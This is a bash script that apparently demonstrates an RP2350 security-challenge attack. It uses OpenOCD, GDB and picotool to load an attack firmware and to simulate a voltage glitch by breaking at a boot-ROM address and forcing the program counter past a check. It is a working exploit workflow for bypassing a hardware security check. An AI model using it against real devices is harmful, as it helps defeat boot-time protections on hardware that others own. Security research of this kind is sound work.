#!/bin/bash

readonly DOCKER_DIR="/rp2350-challenge"

echo "[*] Starting Glitch Simulation."
echo "[!] Please press the BOOTSEL button on the RP2350 and keep it pressed"
read -p "[?] Button pressed? (Press Enter to continue)"

echo "[+] Starting OpenOCD"



tmux new-session -d -s rp2350-poc;
tmux new-window -t rp2350-poc:1 -n 'openocd'; 
tmux send-keys 'cd /rp2350-challenge/deps/openocd/tcl && ../src/openocd -f interface/cmsis-dap.cfg -f target/rp2350.cfg -c "adapter speed 5000"' 'C-m';

tmux select-window -t rp2350-poc:0;
tmux send-keys 'picocom -b 115200 /dev/ttyACM0' 'C-m';
tmux split-window -h;

echo "[+] Resetting target"

tmux send-keys 'gdb-multiarch --batch --nx --ex "target remote :3333" -ex "monitor reset run" ' 'C-m'
sleep 2;

echo "[!] Please release the button now."
read -p "[?] Button released? (Press Enter to continue)"

echo "[+] Loading Attack Firmware."
tmux send-keys '/rp2350-challenge/deps/picotool/build/picotool load -o 0x20000000 /rp2350-challenge/firmware/build/rp2350_attack_poc.bin' 'C-m'


echo "[+] Setup glitch simulation via GDB"
tmux send-keys 'gdb-multiarch --batch --nx -ex "target remote :3333" -ex "hbreak *0x59e" -ex "shell sleep 2" -ex "c" -ex "set \$pc=0x5a1" -ex "c"' 'C-m'

echo "[+] Issuing modified reboot command"
tmux split-window -v && sleep 1;
tmux send-keys '/rp2350-challenge/deps/picotool/build/picotool reboot' 'C-m'
sleep 1;

echo "[+] Droppig into interactive tmux session"
sleep 2;
tmux send-keys '# Execute the command below to exit the attack' 'C-m'
tmux send-keys 'tmux kill-session'

tmux -2 attach-session -t rp2350-poc

echo "[!] End of demo"